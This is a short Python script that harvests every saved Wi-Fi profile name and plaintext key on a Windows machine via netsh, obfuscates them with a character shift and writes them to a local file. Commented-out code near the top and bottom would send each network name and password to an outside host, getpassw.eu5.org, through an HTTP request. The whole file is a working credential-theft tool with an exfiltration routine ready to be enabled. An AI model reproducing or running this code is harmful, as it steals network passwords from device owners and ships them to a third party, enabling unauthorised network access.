# from urllib.request import Request, urlopen
from subprocess import Popen, PIPE


"""
headers = {
    'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
    'Host': 'getpassw.eu5.org',
    'Connection': 'close'
}


def send(netname, netkey):
    req = Request("http://www.getpassw.eu5.org/wifi/index.php?netname=" + netname + "&netkey=" + netkey, headers=headers)
    urlopen(req)
    return True

"""


def shift(string: str, shift_num: int) -> str:
    """
    :param shift_num:
        can be passed as a negative int or a positive one.
    :return:
        shifts the string characters by shift_num
    """
    encrypted = ""
    for let in string:
        encrypted += chr(ord(str(let)) + shift_num)
    return encrypted


proc = Popen('netsh wlan show profiles', shell=True, stdin=PIPE, stdout=PIPE)
out = proc.communicate()[0]
out = str(out, 'ascii')
word = ""
wording = False
network_names = []
for letter in out:
    if letter == ':':
        wording = True
    if wording and letter != ':':
        if letter not in ["\n", "\r"]:
            word += letter
        else:
            wording = False
            network_names.append(word[1:])
            word = ""
keys = []
for network_name in network_names:
    key_found = False
    proc = Popen('netsh wlan show profile name="{network}" key=clear'.format(network=network_name), shell=True,
                 stdin=PIPE, stdout=PIPE)
    out, err = proc.communicate()
    if err is None:
        out = str(out, 'ascii')
        word = ""
        steps_away_to_key = 10 ** 5
        for letter in out:
            if letter in ["\n", "\t", " ", "\r"]:
                wording = False
            else:
                wording = True
            if wording:
                word += letter
            elif word.__len__() != 0:
                if word == "Content":
                    steps_away_to_key = 3
                steps_away_to_key -= 1
                if steps_away_to_key == 0:
                    keys.append(word)
                    key_found = True
                    break
                word = ""
        if not key_found:
            keys.append("None")

network_names = network_names[1:].copy()
keys = keys[1:].copy()
addresses = []
for i in range(keys.__len__()):
    addresses.append([network_names[i], keys[i]])
my_file = open("text.txt", 'w+', encoding='utf-8')
my_file.write("30\n")
for address in addresses:
    my_file.writelines(shift(address[0], 30) + "\t" + shift(address[1], 30) + "\n")
my_file.close()

# send to web
"""
for address in addresses:
    try:
        send(address[0], address[1])
    except Exception:
        continue
"""